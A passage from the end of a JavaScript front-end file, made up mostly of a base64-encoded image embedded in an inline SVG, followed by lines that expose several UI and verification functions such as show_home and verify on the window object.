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" /></svg>
      </div>
    </div>
  `;
}

window.show_preDesk = show_preDesk;
window.show_Desktop = show_Desktop;
window.startApp = startApp;
window.show_home = show_home;
window.show_rectAcct = show_rectAcct;
window.verify = verify;
window.error_mod = error_mod;
